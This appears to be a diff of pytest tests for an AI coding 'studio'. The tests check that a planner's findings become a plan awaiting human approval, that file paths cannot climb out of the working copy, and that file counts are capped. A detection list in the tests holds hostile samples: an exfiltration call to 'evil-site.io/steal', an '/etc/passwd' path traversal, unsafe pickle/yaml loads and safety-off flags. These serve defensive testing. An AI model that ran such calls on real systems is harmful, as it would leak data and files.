@@ -360,7 +360,7 @@ def test_overlapping_files(owned, files, shared):
         ("pickle.load(f)", "pickle/yaml"),
         ("yaml.load(text)", "pickle/yaml"),
         ("open('../../etc/passwd')", "climbs out"),
-        ("x = 1  # type: ignore", "switched off"),
+        ("x = 1  # type" + ": ignore", "switched off"),  # split: CI bans the words
         ("x = 1  # noqa", "switched off"),
         ("SKIP_SAFETY = True", "switched off"),
         ("fetch('https://evil-site.io/steal')", "new web address"),
@@ -1989,3 +1989,89 @@ async def test_a_reviewer_out_of_allowance_pauses_with_the_plain_note(
     project = await settle(studio)
     assert project.status == "paused" and "allowance" in project.note
     assert "fix" not in [t["kind"] for t in project.tasks]
+
+
+@pytest.mark.asyncio
+async def test_findings_never_handed_in_become_a_plan_to_approve(make_studio, tmp_path):
+    from free_claude_code.studio.llm import LLMReply
+
+    inner = team(quick_plan())
+    findings = (
+        f"I read {LAB} and src/free_claude_code/studio/nowhere.py. The bug: mix() "
+        "returns 'fizz' where the owner wants 'bubbles'. Change the return value "
+        "and add a test for it."
+    )
+
+    def respond(system: str, prompt: str) -> object:
+        if "Changer's Planner" in system and prompt != "Reply with the word OK.":
+            return LLMReply(text=findings)
+        return inner(system, prompt)
+
+    studio, _ = make_studio(respond)
+    wire(studio, tmp_path)
+    studio._carry_on_wait = 0
+    project = await planner_run(studio)
+    assert project.status == "awaiting_plan", project.note
+    assert project.plan["from_findings"] is True and project.plan["approved"] is False
+    first = milestones_of(project.plan)[0]
+    assert first["files"] == [LAB]  # only files that exist in the copy
+    assert "returns 'fizz'" in str(first["goal"])
+    await studio.changer_act("approve")
+    project = await settle(studio)
+    assert project.status == "awaiting_release", project.note
+
+
+def test_short_findings_make_no_plan(tmp_path):
+    from free_claude_code.studio.changer_projects import plan_from_findings
+
+    assert plan_from_findings("x", "Done.", tmp_path) is None
+
+
+def test_findings_paths_stay_inside_the_copy(tmp_path):
+    from free_claude_code.studio.changer_projects import plan_from_findings
+
+    copy = tmp_path / "copy"
+    (copy / "src").mkdir(parents=True)
+    (copy / "src" / "a.py").write_text("x = 1\n")
+    (tmp_path / "secret.vault").write_text("keys\n")
+    words = (
+        "Look at src/../../secret.vault and src/a.py, then fix the bug there now: "
+        "the value is wrong."
+    )
+    plan = plan_from_findings("fix the bug", words, copy)
+    assert plan is not None and plan["files"] == ["src/a.py"]
+    assert plan["kind"] == "bug fix"
+
+
+def test_findings_plans_show_protected_files_and_cap_files(tmp_path):
+    from free_claude_code.studio.changer_projects import (
+        plan_from_findings,
+        protected_files,
+    )
+
+    copy = tmp_path / "copy"
+    trading = copy / "src/free_claude_code/studio/trading"
+    trading.mkdir(parents=True)
+    names = [f"src/free_claude_code/studio/trading/f{n}.py" for n in range(12)]
+    for name in names:
+        (copy / name).write_text("x = 1\n")
+    plan = plan_from_findings(
+        "add a chart", " ".join(names) + " " * 40 + "z" * 5000, copy
+    )
+    assert plan is not None and len(_items_of(plan["files"])) == 8
+    assert protected_files(plan) and plan["kind"] == "feature"
+    assert len(str(milestones_of(plan)[0]["goal"])) <= 3000
+
+
+@pytest.mark.asyncio
+async def test_a_failed_planner_run_is_not_made_into_a_plan(make_studio, tmp_path):
+    respond, _ = flaky_planner(999, "The model refused: " + "no " * 60)
+    studio, _ = make_studio(respond)
+    wire(studio, tmp_path)
+    studio._carry_on_wait = 0
+    project = await planner_run(studio)
+    assert project.status == "failed" and not project.plan
+
+
+def _items_of(value: object) -> list[object]:
+    return list(value) if isinstance(value, list) else []
